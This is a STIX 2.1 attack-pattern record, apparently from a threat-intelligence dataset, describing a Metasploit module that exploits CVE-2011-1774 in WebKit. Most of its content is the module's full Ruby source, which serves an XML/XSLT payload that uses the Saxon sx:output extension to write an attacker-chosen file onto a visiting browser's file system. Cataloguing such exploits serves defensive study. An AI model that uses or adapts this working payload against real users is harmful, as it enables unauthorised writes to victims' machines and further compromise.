{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--89577375-c156-46f7-b3b3-b4b83a4b1e24",
    "created": "2024-08-14T16:21:58.069827Z",
    "modified": "2024-08-14T16:21:58.069831Z",
    "name": "Cross Platform Webkit File Dropper",
    "description": " This module exploits a XSLT vulnerability in Webkit to drop ASCII or UTF-8 files to the target file-system.  By default, the file will be dropped in C:\\Program Files\\ ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/webkit_xslt_dropper.rb",
            "external_id": "webkit_xslt_dropper.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1774"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Cross Platform Webkit File Dropper',\n      'Description' => %q{\n          This module exploits a XSLT vulnerability in Webkit to drop ASCII or UTF-8\n        files to the target file-system.  By default, the file will be dropped in\n        C:\\Program Files\\\n      },\n      'Author'      => [ 'Nicolas Gregoire' ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2011-1774' ]\n        ],\n      'Actions'     =>\n        [\n          [ 'WebServer', 'Description' => 'Serve exploit via web server' ]\n        ],\n      'PassiveActions' =>\n        [\n          'WebServer'\n        ],\n      'DefaultAction'  => 'WebServer'))\n\n    register_options(\n      [\n        OptString.new('REMOTE_PATH', [ true, \"Location of the remote file\", 'flag.txt' ]),\n        OptString.new('REMOTE_CONTENT', [ true, \"Content of the remote file\", 'Hello from CVE-2011-1774' ])\n      ])\n  end\n\n  def on_request_uri(cli, request)\n    path  = datastore['REMOTE_PATH']\n    content  = datastore['REMOTE_CONTENT']\n    html = <<-EOS\n<?xml-stylesheet type=\"text/xml\" href=\"#fragment\"?>\n<!-- Define the DTD of the document\n     This is needed, in order to later reference the XSLT stylesheet by a #fragment\n     This trick allows to have both the XML and the XSL in the same file\n     Cf. http://scarybeastsecurity.blogspot.com/2011/01/harmless-svg-xslt-curiousity.html -->\n<!DOCTYPE doc [\n <!ATTLIST xsl:stylesheet\n id ID #REQUIRED\n>]>\n<doc>\n\n<!-- Define location and content of the file -->\n<path><![CDATA[#{path}]]></path>\n<content><![CDATA[#{content}]]></content>\n\n<!-- The XSLT stylesheet header, including the \"sx\" extension -->\n<xsl:stylesheet id=\"fragment\" version=\"1.0\"\n  xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n  xmlns:sx=\"http://icl.com/saxon\"\n  extension-element-prefixes=\"sx\"\n  xmlns=\"http://www.w3.org/1999/xhtml\" >\n<xsl:output method=\"xml\" indent=\"yes\" />\n\n<!-- The XSLT template -->\n<xsl:template match=\"/\">\n        <!-- Create the file -->\n        <xsl:variable name=\"path\" select=\"//path/text()\"/>\n        <sx:output file=\"{$path}\" method=\"text\">\n                <xsl:value-of select=\"//content\"/>\n        </sx:output>\n        <!-- Send some output to the browser -->\n        <html> </html>\n</xsl:template>\n</xsl:stylesheet>\n</doc>\nEOS\n\n    print_status(\"Sending XSLT payload ...\")\n    print_status(\"Destination file : #{path}\")\n    send_response_html(cli, html, { 'Content-Type' => 'application/xml' })\n  end\n\n  def run\n    exploit()\n  end\nend\n"
}